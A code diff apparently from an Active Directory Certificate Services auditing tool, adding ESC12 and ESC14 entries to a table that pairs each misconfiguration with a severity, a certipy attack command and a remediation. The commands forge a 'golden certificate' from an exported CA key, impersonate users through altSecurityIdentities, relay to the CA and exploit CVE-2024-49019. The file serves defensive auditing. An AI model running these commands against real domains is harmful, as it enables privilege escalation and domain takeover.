@@ -60,10 +60,19 @@ _ESC = {
     "ESC11": ("high", "IF_ENFORCEENCRYPTICERTREQUEST off -> relay to the CA over RPC (ICPR)",
               "certipy relay -target 'rpc://<CA>' -template DomainController  # + coerce a DC",
               "Enable IF_ENFORCEENCRYPTICERTREQUEST (encrypt ICPR requests)."),
+    "ESC12": ("critical", "Shell access to a CA whose key is on a YubiHSM (PIN in registry) -> forge certs",
+              "# on the CA host: recover the YubiHSM auth key from the registry, export the CA key, then "
+              "certipy forge -ca-pfx ca.pfx -upn administrator@<DOMAIN>  # golden certificate",
+              "Restrict shell/admin access to CA hosts; protect the HSM auth secret."),
     "ESC13": ("high", "Template issuance policy is linked to a privileged group",
               "certipy req -u <user>@<DOMAIN> -p <pass> -dc-ip <dc> -ca '<CA>' -template '<TEMPLATE>'  "
               "# the issued cert grants the linked group's rights",
               "Unlink the issuance policy from privileged groups."),
+    "ESC14": ("high", "Write access to a target's altSecurityIdentities -> explicit cert mapping to impersonate",
+              "certipy account update -u <user>@<DOMAIN> -p <pass> -dc-ip <dc> -user <victim> "
+              "-upn <victim>  # then map a cert you control to the victim via altSecurityIdentities",
+              "Enforce strong certificate mapping (StrongCertificateBindingEnforcement=2); "
+              "restrict write access to altSecurityIdentities."),
     "ESC15": ("critical", "EKUwu (CVE-2024-49019): inject application policies on a v1 template",
               "certipy req -u <user>@<DOMAIN> -p <pass> -dc-ip <dc> -ca '<CA>' -template '<TEMPLATE>' "
               "-application-policies '1.3.6.1.4.1.311.20.2.1'  # Enrolment Agent -> ESC3",
